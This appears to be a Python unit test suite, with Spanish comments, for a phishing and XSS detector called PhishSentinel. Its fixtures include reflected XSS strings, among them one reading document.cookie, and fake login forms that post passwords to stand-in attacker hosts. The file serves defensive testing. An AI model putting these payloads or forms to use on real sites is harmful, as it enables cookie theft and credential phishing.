"""Pruebas automáticas:  python -m unittest discover -s tests -v
No necesitan Internet: la descarga de páginas se simula."""
import os
import tempfile
import unittest
from unittest import mock

os.environ["PHISHSENTINEL_DATA"] = tempfile.mkdtemp()      # historial/excepciones aislados

from phishsentinel import engine as eng_mod, storage                      # noqa: E402
from phishsentinel.engine import Engine                                   # noqa: E402
from phishsentinel.features_content import analyze_content                # noqa: E402
from pathlib import Path                                                  # noqa: E402
from phishsentinel.features_url import (FEATURE_NAMES, brand_hit, extract_url_features, normalize_url,   # noqa: E402
                                        registered_domain, to_vector)


def page(body="", title="Inicio", head=""):
    return f"<html><head><title>{title}</title>{head}</head><body>{body}</body></html>"


class TestFeatures(unittest.TestCase):
    def test_normalizacion_quita_esquema_y_www(self):
        self.assertEqual(normalize_url("HTTPS://www.Example.com/a"), "Example.com/a")
        a, b = extract_url_features("http://example.com/a?x=1"), extract_url_features("https://www.example.com/a?x=1")
        self.assertEqual([a[k] for k in FEATURE_NAMES], [b[k] for k in FEATURE_NAMES])   # el modelo no ve el esquema
        self.assertEqual((a["https"], b["https"]), (0, 1))                                # pero se conserva como dato

    def test_barra_final_de_dominio_solo_no_cambia_nada(self):
        self.assertEqual(normalize_url("https://www.a.com/"), normalize_url("a.com"))
        self.assertEqual(normalize_url("a.com/x/"), "a.com/x/")           # en rutas sí se conserva
        a, b = extract_url_features("https://a.com/"), extract_url_features("a.com")
        self.assertEqual([a[k] for k in FEATURE_NAMES], [b[k] for k in FEATURE_NAMES])

    def test_plataforma_de_alojamiento_se_neutraliza(self):
        self.assertEqual(normalize_url("https://jane.github.io/blog/x"), "jane.com/blog/x")
        self.assertEqual(normalize_url("http://a-b.pages.dev/"), "a-b.com")
        self.assertEqual(normalize_url("https://x.y.vercel.app:8080/p?q=1"), "x.y.com:8080/p?q=1")
        self.assertEqual(normalize_url("https://github.io/"), "github.io")              # sin inquilino: no se toca
        a, b = extract_url_features("https://jane.github.io/a"), extract_url_features("https://jane.pages.dev/a")
        self.assertEqual([a[k] for k in FEATURE_NAMES], [b[k] for k in FEATURE_NAMES])  # la plataforma no cuenta

    def test_vector_completo(self):
        self.assertEqual(len(to_vector(extract_url_features("x.com"))), len(FEATURE_NAMES))
        self.assertEqual(len(to_vector(extract_url_features(""))), len(FEATURE_NAMES))

    def test_marca_suplantada(self):
        self.assertEqual(extract_url_features("http://paypal.com.secure-login.evil.tk/x")["brand_in_subdomain"], 1)
        self.assertEqual(extract_url_features("paypal-secure-login.com")["brand_in_domain_mismatch"], 1)
        self.assertEqual(extract_url_features("https://www.paypal.com/signin")["brand_in_domain_mismatch"], 0)

    def test_xss_y_redireccion(self):
        f = extract_url_features("https://a.com/?q=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertTrue(f["xss_tag"] and f["xss_func"])
        self.assertEqual(extract_url_features("https://a.com/go?u=https%3A%2F%2Fb.com%2F")["query_has_url"], 1)

    def test_dominio_registrado(self):
        self.assertEqual(registered_domain("https://login.example.co.uk/x"), "example.co.uk")


class TestMarcas(unittest.TestCase):          # aporte de la versión del compañero
    def test_disfraces_y_typosquatting(self):
        self.assertEqual(brand_hit("bancol0mbia"), "disfraza")
        self.assertEqual(brand_hit("paypa1"), "disfraza")
        self.assertEqual(brand_hit("instagran"), "casi_igual")
        self.assertEqual(brand_hit("nequi-premios"), "contiene")

    def test_no_marca_a_los_legitimos(self):
        for d in ("paypal", "google", "applebees", "wikipedia", "googleapis", "guardian"):
            self.assertEqual(brand_hit(d), "", d)

    def test_caracteristicas_de_marca(self):
        f = extract_url_features("http://bancol0mbia-seguro.xyz/login")
        self.assertEqual((f["brand_disguised"], f["brand_contains"], f["susp_tld"]), (1, 0, 1))


HTML = Path(__file__).resolve().parent.parent / "data" / "eval" / "html"


@unittest.skipUnless(HTML.exists(), "faltan las páginas de ejemplo data/eval/html")
class TestPaginasDeEjemplo(unittest.TestCase):
    def score(self, name, url):
        return analyze_content((HTML / name).read_text(encoding="utf-8"), url)[0]

    def test_legitimas_puntuan_bajo(self):
        self.assertLess(self.score("legit_articulo_largo.html", "https://www.eltiempo.com/colombia/x"), 0.3)
        self.assertLess(self.score("legit_github.html", "https://github.com/a/b"), 0.3)
        self.assertLess(self.score("legit_login_google.html", "https://accounts.google.com/v3/signin"), 0.3)

    def test_kits_de_phishing_puntuan_alto(self):
        self.assertGreaterEqual(self.score("phish_banco_kit.html", "http://bancolombia-seguridad-verificacion.xyz/l.php"), 0.5)
        self.assertGreaterEqual(self.score("phish_office_externo.html", "https://docs-share-onedrive.web.app/view"), 0.5)
        self.assertGreaterEqual(self.score("phish_netflix_tarjeta.html", "https://secure-account-update.com/billing"), 0.5)
        self.assertGreaterEqual(self.score("xss_reflejado.html", "https://tienda.example.com/buscar?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"), 0.5)


class TestCapa2(unittest.TestCase):
    def test_login_hacia_subdominio_propio_no_es_externo(self):      # falso positivo de v1 (hostname exacto)
        h = page('<form action="https://login.shop.com/auth"><input type="password"></form>')
        self.assertEqual(analyze_content(h, "https://www.shop.com/")[1]["pw_form_external"], 0)

    def test_login_con_google_no_es_phishing(self):
        h = page('<form action="https://accounts.google.com/signin"><input type="password"></form>')
        self.assertEqual(analyze_content(h, "https://miapp.com/")[1]["pw_form_external"], 0)

    def test_iframe_oculto_de_google_tag_manager_se_ignora(self):    # falso positivo de v1
        h = page('<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" style="display:none"></iframe>')
        s, f, _ = analyze_content(h, "https://blog.com/")
        self.assertEqual(f["hidden_iframes"], 0)
        self.assertEqual(s, 0.0)

    def test_scripts_externos_y_eval_suelto_no_puntuan(self):         # falsos positivos de v1
        h = page("".join(f'<script src="https://cdn{i}.net/a.js"></script>' for i in range(6))
                 + "<script>eval('1');document.write('x');atob('')</script>")
        self.assertLess(analyze_content(h, "https://blog.com/")[0], 0.3)

    def test_kit_de_phishing_con_marca_y_formulario_externo(self):
        h = page('<form action="http://evil-collector.xyz/p.php"><input name="u"><input type="password"></form>',
                 title="PayPal - Log in")
        s, f, r = analyze_content(h, "https://secure-acct-12345.top/login")
        self.assertGreaterEqual(s, 0.8)
        self.assertTrue(f["pw_form_external"] and f["brand_title_mismatch"])
        self.assertTrue(any("otro dominio" in x for x in r))

    def test_marca_en_su_propio_dominio_es_legitima(self):
        h = page('<form action="/login"><input type="password"></form>', title="PayPal - Log in")
        self.assertEqual(analyze_content(h, "https://www.paypal.com/signin")[1]["brand_title_mismatch"], 0)

    def test_formulario_hacia_ip(self):
        h = page('<form action="http://185.12.4.9/g.php"><input type="password"></form>')
        self.assertEqual(analyze_content(h, "https://x.com/")[1]["pw_form_ip"], 1)

    def test_xss_reflejado(self):
        payload = "<script>alert(1)</script>"
        s, f, _ = analyze_content(page(f"<p>{payload}</p>"), "https://a.com/?q=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertEqual(f["reflected_params"], 1)
        s2, f2, _ = analyze_content(page("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>"),
                                    "https://a.com/?q=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertEqual(f2["reflected_params"], 0)                   # si el sitio lo codifica, no hay XSS

    def test_pagina_normal_puntaje_cero(self):
        self.assertEqual(analyze_content(page("<h1>Hola</h1><a href='/x'>x</a>"), "https://a.com/")[0], 0.0)


class FakeBundle(dict):
    """Modelo falso: el test fija la probabilidad de la capa 1."""


class TestMotor(unittest.TestCase):
    def setUp(self):
        self.e = Engine()
        self.e.bundle = None                  # sin modelo real: p1 se fija a mano
        self.e.t_low, self.e.t_high = 0.20, 0.90
        self.p1 = 0.5
        self.patch = mock.patch.object(Engine, "_url_proba", lambda s, u, f: (self.p1, "phishing"))
        self.patch.start()

        self.age = mock.patch.object(eng_mod, "domain_age_days", lambda d: self._age)
        self._age = None
        self.age.start()

    def tearDown(self):
        self.patch.stop()
        self.age.stop()

    def test_dominio_muy_nuevo_sube_el_puntaje_en_zona_de_duda(self):
        self._age = 5
        v, _ = self.run_with(0.45, html=None)                 # sin página: solo URL + antigüedad
        self.assertEqual(v.level, "sospechosa")               # 0.45 + 0.25 = 0.70
        self.assertTrue(any("5 días" in r for r in v.reasons))

    def test_dominio_viejo_o_desconocido_no_cambia_nada(self):
        for age in (4000, None):
            self._age = age
            v, _ = self.run_with(0.45, html=None)
            self.assertEqual((v.level, v.score), ("segura", 0.45))

    def test_la_antiguedad_nunca_baja_un_puntaje(self):
        self._age = 9000
        v, _ = self.run_with(0.60, html=None)
        self.assertEqual(v.level, "sospechosa")

    def test_sin_red_no_se_consulta_la_antiguedad(self):
        self._age = 1
        v, _ = self.run_with(0.45, html=None, fetch=False)
        self.assertEqual(v.score, 0.45)

    def run_with(self, p1, html=None, url="https://sitio-dudoso.com/", **kw):
        self.p1 = p1
        with mock.patch.object(eng_mod, "fetch_page", return_value=(html, url)) as fp:
            v = self.e.analyze(url, log=False, **kw)
        return v, fp

    def test_zona_alta_bloquea_sin_contactar_el_sitio(self):
        v, fp = self.run_with(0.95, html=page("<h1>hola</h1>"))
        self.assertEqual((v.level, v.zone), ("peligrosa", "alta"))
        fp.assert_not_called()

    def test_plataforma_gratuita_no_se_bloquea_solo_por_la_url(self):
        v, _ = self.run_with(0.97, html=None, url="https://juan.github.io/portafolio/")
        self.assertEqual(v.level, "sospechosa")                 # nunca 'peligrosa' sin confirmar el contenido
        h = page('<form action="http://evil.xyz/p.php"><input type="password"></form>', title="PayPal - Log in")
        v2, _ = self.run_with(0.97, html=h, url="https://paypal-login.pages.dev/")
        self.assertEqual(v2.level, "peligrosa")                 # con evidencia en la página, sí

    def test_zona_baja_deja_pasar_sin_contactar_el_sitio(self):
        v, fp = self.run_with(0.05)
        self.assertEqual((v.level, v.zone), ("segura", "baja"))
        fp.assert_not_called()

    def test_zona_duda_pagina_limpia_la_capa2_manda_y_baja_la_sospecha(self):
        v, fp = self.run_with(0.60, html=page("<h1>Receta</h1>" + "<p>texto largo</p>" * 40))
        fp.assert_called_once()
        self.assertEqual((v.zone, v.level, v.decided_by), ("duda", "segura", "capa 2"))
        self.assertLess(v.score, 0.5)

    def test_zona_duda_kit_de_phishing_sube_a_peligrosa(self):
        h = page('<form action="http://evil.xyz/p.php"><input type="password"></form>', title="PayPal - Log in")
        v, _ = self.run_with(0.40, html=h, url="https://secure-acct-1.top/login")
        self.assertEqual((v.level, v.threat, v.decided_by), ("peligrosa", "phishing", "capa 2"))

    def test_zona_duda_sin_red_usa_solo_capa1(self):
        v, _ = self.run_with(0.60, html=None)
        self.assertEqual((v.level, v.content_checked), ("sospechosa", False))
        self.assertTrue(any("no se pudo descargar" in r for r in v.reasons))

    def test_analisis_profundo_consulta_capa2_incluso_en_zona_baja(self):
        h = page('<form action="http://evil.xyz/p.php"><input type="password"></form>', title="PayPal - Log in")
        v, fp = self.run_with(0.05, html=h, url="https://secure-acct-1.top/login", deep=True)
        fp.assert_called_once()
        self.assertNotEqual(v.level, "segura")

    def test_contenido_nunca_baja_la_zona_alta(self):
        v, _ = self.run_with(0.97, html=page("<h1>limpio</h1>"), deep=True)
        self.assertEqual(v.level, "peligrosa")

    def test_excepcion_de_dominio_deja_pasar(self):
        storage.add_whitelist("amigo.com")
        v, fp = self.run_with(0.99, url="https://tienda.amigo.com/x")      # subdominio de un dominio exceptuado
        self.assertEqual((v.level, v.decided_by), ("segura", "excepcion"))
        fp.assert_not_called()

    def test_excepcion_NUNCA_anula_una_inyeccion_xss(self):
        storage.add_whitelist("amigo.com")
        v, _ = self.run_with(0.99, url="https://amigo.com/?q=<script>alert(1)</script>")
        self.assertNotEqual(v.decided_by, "excepcion")
        self.assertEqual(v.level, "peligrosa")


if __name__ == "__main__":
    unittest.main()


class TestEdadDominio(unittest.TestCase):
    def test_parseo_rdap_y_bonos(self):
        from datetime import datetime, timedelta, timezone
        from phishsentinel.domain_age import _parse_registration, age_bonus
        f = lambda d: (datetime.now(timezone.utc) - timedelta(days=d)).strftime("%Y-%m-%dT%H:%M:%SZ")
        self.assertEqual(_parse_registration({"events": [{"eventAction": "registration", "eventDate": f(10)}]}), 10)
        self.assertIsNone(_parse_registration({"events": []}))
        self.assertEqual(age_bonus(10)[0], 0.25)
        self.assertEqual(age_bonus(60)[0], 0.10)
        self.assertEqual(age_bonus(400)[0], 0.0)
        self.assertEqual(age_bonus(None)[0], 0.0)
